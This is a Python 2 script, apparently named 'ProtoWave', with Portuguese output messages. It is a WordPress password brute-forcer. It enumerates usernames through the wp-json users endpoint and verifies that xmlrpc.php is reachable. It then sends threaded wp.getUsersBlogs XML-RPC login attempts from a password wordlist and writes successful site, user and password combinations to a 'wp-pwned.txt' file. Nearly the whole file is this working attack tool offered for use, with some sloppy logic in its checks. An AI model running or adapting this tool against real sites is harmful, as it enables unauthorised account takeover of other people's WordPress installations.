#!/usr/bin/python
#coding: utf-8

import argparse as arg
import sys,time,requests,json,thread

print(''' 
    ____             __      _       __
   / __ \_________  / /_____| |     / /___ __   _____ 
  / /_/ / ___/ __ \/ __/ __ \ | /| / / __ `/ | / / _ \

 / ____/ /  / /_/ / /_/ /_/ / |/ |/ / /_/ /| |/ /  __/
/_/   /_/   \____/\__/\____/|__/|__/\__,_/ |___/\___/ 
 v1.1

[!] Brute Force Wordpress
[!] Desenvolvido por ./Cryptonking (B4l0x)
''')

parser = arg.ArgumentParser(description="Wordpress brute/scan by B4l0x")
parser.add_argument("--url", "-u", help="Site wordpress", required=True, type=str)
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas", required=True, default="wordlist.txt", type=str)
parser.add_argument("--usuario", help="Usuario alvo", default="null", required=False, type=str)
parser.add_argument("--tempo", "-t", default="1", help="Time sleep usado no Thread", required=False, type=int)
x = parser.parse_args()
site = x.url

site.replace("https://", "http://")
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 'Cookie': 'humans_21909=1'}
usuarios = []
wordpressOK = []
confirmado= []
alocthread = thread.allocate_lock()

def verwp():
    tempo = time.strftime("%H:%M:%S")
    try:
        print("[{} INFO] Confirmando site wordpress...").format(tempo)
        try:
            response = requests.get(site+"/xmlrpc.php", timeout=20, headers=header).text
            logins = requests.get(site+"/wp-json/wp/v2/users", timeout=20, headers=header).text
        except Exception as e:
            print("[{} INFO] Host nao pode ser resolvido erro: {}").format(tempo, e)
            exit()
        if "XML-RPC" in response:
            print("[{} INFO] URL {} [XMLRPC] [OK]").format(tempo,site)
            if "slug" in logins:
                print("[{} INFO] URL {} [LOGIN] [OK]").format(tempo,site)
                confirmado.append("1")
                wordpressOK.append(site)
            else:
                print("[{} INFO] URL {} [LOGIN API OFF]").format(tempo,site)
                exit()
        elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
            print("[{} INFO] URL {} [XMLRPC Bloqueado]").format(tempo,site)
            print(response)
            exit()
    except KeyboardInterrupt:
        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
        exit()
    except Exception as e:
        print("[{} INFO] Host nao pode ser resolvido erro: {}").format(tempo, e)
        exit()

def capturausuarios():
    tempo = time.strftime("%H:%M:%S")
    try:
        if confirmado[0] != "":
            try:
                print("\n[{} INFO] Inciando busca de usuario(s)...").format(tempo)
                for site in wordpressOK:
                    response = requests.get(site+"/wp-json/wp/v2/users", timeout=5, headers=header).text
                    if "slug" in response:
                        dados = json.loads(response)
                        for user in dados[0:40]:
                            print("[{} INFO] Usuario(s) encontrado(s): {}").format(tempo,user['slug'])
                            usuarios.append(user['slug'])
                        print("")
                    elif not "slug" in response:
                        print("[{} INFO] Nao foi possivel encontrar usuario(s) nessa url: {}").format(tempo,url)
            except Exception as e:
                print("[{} INFO] Erro ao obter usuarios, seu teste sera inciado usando admin {}").format(tempo, e)
                usuarios.append('admin')
    except KeyboardInterrupt:
        print("[{} INFO] Obrigado por usar meu script!").format(tempo)
        exit()
    except:
        print("[{} INFO] Falha ao confirmar site wordpress...").format(tempo)
        exit()
        
def brute(i):
    tempo = time.strftime("%H:%M:%S")
    try:
        for site in wordpressOK:
            senha = i.replace("\n", "")
            response = requests.get(site+"/xmlrpc.php", timeout=10, headers=header).text
            if "XML-RPC server accepts POST requests only." in response:
                for usuario in usuarios:
                    payload='''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>'''%(usuario,senha)                                
                    r = requests.post(site+"/xmlrpc.php", data=payload, timeout=30, headers=header).text
                    if 'isAdmin' in r:
                        alocthread.acquire()
                        print("\n\t[{} LOGIN EFETUADO COM SUCESSO] URL: {} <=> {}:{}\n").format(str(tempo),site,usuario,senha)
                        f = open("wp-pwned.txt", "a")
                        f.write(site+" => "+usuario+" => "+senha+"\n")
                        f.close()
                        break
                        alocthread.release()
                    elif 'faultString' in r:
                        alocthread.acquire()
                        print("[{} FALHOU] URL: {} <=> {}:{}").format(str(tempo),site,usuario,senha)
                        alocthread.release()
                    elif 'Not Acceptable!' in r:
                        alocthread.acquire()
                        print("[{} FIREWALL] URL: {}").format(str(tempo),site)
                        exit()
                        break
                        alocthread.release()
                    else:
                        break
            elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                print("[{} XMLRPC BLOQUEADO] URL {} <=> {}:{}").format(str(tempo),site,usuario,senha)
                exit()
    except KeyboardInterrupt:
        print("[{} INFO] Obrigado por usar meu script!").format(str(tempo))
        exit()
    except Exception as e:
        print("[{} INFO] Conexao perdida com o host, Reconectando...").format(str(tempo))
        exit()
        
if(x.usuario == "null"):
    verwp()
    capturausuarios()
elif(x.usuario != "null"):
    tempo = time.strftime("%H:%M:%S")
    verwp()
    wordpressOK.append(site)
    confirmado.append("1")
    usuarios.append(x.usuario)
    print("[{} INFO] Brute force sera inciado usando login {}\n").format(tempo,x.usuario)

try:
    try:
        wordlist = open(x.wordlist, 'r').readlines()
    except:
        tempo = time.strftime("%H:%M:%S")
        print("[{} INFO] Verifique o caminho da wordlist e tente novamente...").format(tempo)
        exit()
    for i in wordlist:
        time.sleep(0.+x.tempo)
        thread.start_new_thread(brute, (i,))
except KeyboardInterrupt:
    tempo = time.strftime("%H:%M:%S")
    print("\n\t[{} INFO] Finalizado, obrigado por usar by B4l0x...\n").format(tempo)
    exit()
